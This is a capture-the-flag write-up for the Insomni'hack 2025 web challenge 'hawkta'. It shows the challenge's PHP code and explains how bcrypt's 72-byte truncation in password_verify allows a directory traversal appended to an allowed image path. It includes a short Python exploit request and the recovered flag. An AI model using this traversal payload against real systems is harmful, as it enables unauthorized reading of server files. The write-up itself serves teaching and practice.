---
title: "hawkta - Insomni'hack 2025"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["web", "php", "hash", "path-traversal", "hawkta", "lfi", "insomni-hack", "insomni-hack-2025", "2025", "ctf-writeup"]
summary: "webinsomnihack2025phpcrypt"
source:
  name: "CTFtime writeup #40118"
  url: "https://ctftime.org/writeup/40118"
original_source: "https://www.norelect.ch/writeups/insomnihack2025/hawkta/"
ctf:
  name: "Insomni'hack 2025"
  year: 2025
  challenge: "hawkta"
---

## Metadata

- **CTF:** Insomni'hack 2025
- **Task:** hawkta
- **Author team:** /mnt/ain
- **CTFtime tags:** web, php, hash
- **CTFtime:** <https://ctftime.org/writeup/40118>
- **Original writeup:** <https://www.norelect.ch/writeups/insomnihack2025/hawkta/>

---
# Hawkta

[web](https://www.norelect.ch/tags/web)[insomnihack2025](https://www.norelect.ch/tags/insomnihack2025)[php](https://www.norelect.ch/tags/php)[crypt](https://www.norelect.ch/tags/crypt)

## Discovery

An initial look at the application tells us that we have a php application with the following source code:

```
    <?php
    
    // Authorized images are matched to their bcrypt hash values for maximum security
    $AUTHORIZED_IMGS = [
        '$2a$12$NmPFGriPq4VEFdx7y4XKde67/DFQgQVk/Cz.HxGWi0PV3aSk/JT12' => 'assets/data/img/cooper-s-hawk-profile-583855629-d89e191a88d1484db08800f067ba98e8.jpg',
        '$2a$12$qsfcrstGdzpRVDNH5Dq//uSK6/Z6ZSBCca7fIeoyRBBdgQk8q3rX6' => 'assets/data/img/Red-shouldered_Hawk_Buteo_lineatus_-_Blue_Cypress_Lake_Florida.jpg',
        '$2a$12$hPNstQ8F.EBu8z2/EDaXROPakN5L/hix0SUQQG6I6RPu/BcvSBDmC' => 'assets/data/img/harris_hawk_web.jpg',
        '$2a$12$dp0lDL1FuN6irg2LB7j.EOFKte1313GSgz5DpBeTAtBY4gyCMd4KS' => 'assets/data/img/Hawk-146809760-612x612.jpg',
        '$2a$12$5zq3d97d5wg1vUvoquZOA.JAeM1.778eWnDgSx/ymj9v1D8d4kLEC' => 'assets/data/img/Hawk-534214314-612x612.jpg',
        //'$2a$12$v5UW4B3/j6F5vymG0tRDx.iSz7RFlrVlH3Om3zC3QfqiG.InCuKMW' => 'flag.txt'
    ];
    
    if (empty($_GET)) {
        include 'index.html';
        exit();
    }
    
    $file_name = isset($_GET['file']) ? (string) $_GET['file'] : null;
    $provided_hash = isset($_GET['hash']) ? (string) $_GET['hash'] : null;
    
    var_dump($AUTHORIZED_IMGS);
    var_dump($file_name);
    var_dump($provided_hash);
    
    if (!$file_name || !$provided_hash) {
        http_response_code(400);
        exit("Missing 'file' or 'hash' parameter.");
    }
    
    // Check if the file is authorized and the hash is valid
    if (isset($AUTHORIZED_IMGS[$provided_hash]) && password_verify($file_name, $provided_hash)) {
    
            header("Content-Type: image/png");
            echo readfile($file_name);
            exit();
    }
    
    // If no match, return forbidden
    http_response_code(403);
    exit("Invalid file or hash.");
    
    ?>
```

Analyzing the code reveals that we need set both the `file` and the `hash` parameter to reach the code that reads out file data. Also, due to the type casts to `string`, it is not possible to try something funny there with different data types.

## Isolation

Due to the fact that it is not possible to modify the static list of valid hashes used as keys in the `AUTHORIZED_IMGS` array, the vulnerability must lie within the following code:

```
    password_verify($file_name, $provided_hash)
```

According to [the documentation](https://www.php.net/manual/en/function.password-verify.php), this function does exactly what you would expect it to do…

Upon closer inspection however, the docs mention the use of the `crypt()` function. And the docs of the `crypt()` function contain this short but important statement:

![PHP Docs Caution Message for CRYPT_BLOWFISH](https://www.norelect.ch/writeups/insomnihack2025/hawkta/crypt_meme.png)

Since the passwords are being truncated to 72 bytes before hashing, we can append arbitrary data after those 72 bytes and still get the same hash!

And wouldn’t you know it, there is a path that 84 bytes long!

```
    assets/data/img/cooper-s-hawk-profile-583855629-d89e191a88d1484db08800f067ba98e8.jpg
```

## Exploit

We can use all of the gained knowledge above to craft a file path that uses the first 72 bytes (or more) of an allowed file and append a directory traversal attack to get the server to return us the flag:

```
    import requests
    
    URL = "https://hawkta.insomnihack.ch/"
    
    r = requests.get(URL + "?file=assets/data/img/cooper-s-hawk-profile-583855629-d89e191a88d1484db08800f067ba9/../../../../../../../../../../var/www/html/flag.txt&hash=$2a$12$NmPFGriPq4VEFdx7y4XKde67/DFQgQVk/Cz.HxGWi0PV3aSk/JT12")
    print(r.text)
```

Running the exploit script gave me the flag: `INS{Okta_w4lked-s0-my-H4wks-c0uld-fly-through-BcRYpT}`
